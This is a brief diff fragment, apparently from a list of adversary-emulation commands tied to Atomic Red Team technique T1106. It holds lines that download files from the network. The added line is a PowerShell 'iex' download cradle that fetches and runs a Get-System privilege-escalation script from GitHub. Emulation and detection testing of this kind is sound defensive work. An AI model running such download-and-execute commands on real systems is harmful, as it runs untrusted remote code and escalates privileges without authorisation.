@@ -78,3 +78,6 @@ cscript //E:Jscript %TEMP%\OSTapGet.js
 @echo off
 powershell -Command "New-Item -Type Directory (split-path \"%source_file%\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1106/src/CreateProcess.cs' -OutFile '%source_file%'"
 
+*
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')
+
